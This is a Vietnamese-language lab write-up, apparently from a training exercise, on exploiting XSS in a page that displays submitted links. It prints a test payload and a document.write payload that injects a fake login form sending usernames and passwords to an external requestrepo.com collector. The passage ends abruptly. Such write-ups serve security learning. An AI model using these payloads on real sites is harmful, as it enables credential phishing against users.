![image](https://github.com/user-attachments/assets/9d95e203-f52a-4134-9587-981ab27d2ed9)

![image](https://github.com/user-attachments/assets/82c28c16-bb55-404f-9c20-eab90b5e023d)

Test 1 số chức năng của web thì là đưa link và nó sẽ hiện ở dưới:

![image](https://github.com/user-attachments/assets/9e431984-81b7-4fcd-8fd8-54f10040f29b)

![image](https://github.com/user-attachments/assets/e706f2f2-3b8a-4470-b476-541c9185f6c0)

Nhìn src code có vẻ sẽ bị xss và do đề bài thế nên xss là chắc chắn:

![image](https://github.com/user-attachments/assets/b1ecd51d-785d-4b8e-971b-38f6feef9ea1)

Dùng payload `' onerror=alert(window.origin)>`  để thử xss:

![image](https://github.com/user-attachments/assets/d61c09b9-92e7-4443-b0e0-d74cff6c3454)

Do đề yêu cầu tạo 1 form gồm username và password để phishing, tôi sử dụng tool [request repo](https://requestrepo.com/), khi vào link https://7gj4ouxh.requestrepo.com/ thì web sẽ redirect đến http://10.129.125.84/phishing/login.php:

![image](https://github.com/user-attachments/assets/bdb2b3fe-12fc-4e75-913e-2d4c04d70c2b)

Sử dụng payload `'document.write('<h3>Please login to continue</h3><form action=https://7gj4ouxh.requestrepo.com/><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form> <script>document.getElementById('urlform').remove()</script>` để tạo login form và xóa cái ô nhập cũ đi:

![image](https://github.com/user-attachments/assets/68b30c0c-4d4d-4314-8adf-51575962dd33)

Sau khi nhập xong thì kết quả sẽ về đây đồng thời đưa về trang login:

![image](https://github.com/user-attachments/assets/9836d250-0a75-415a-811d-c5cb1e3b6dc2)

Lmao, tôi làm thử như thế hay phết mà không được

![image](https://github.com/user-attachments/assets/83a0655c-116a-4743-ab83-85d339c008b4)

Sau khi tìm hiểu thì có vẻ phải làm theo cách của bài ...

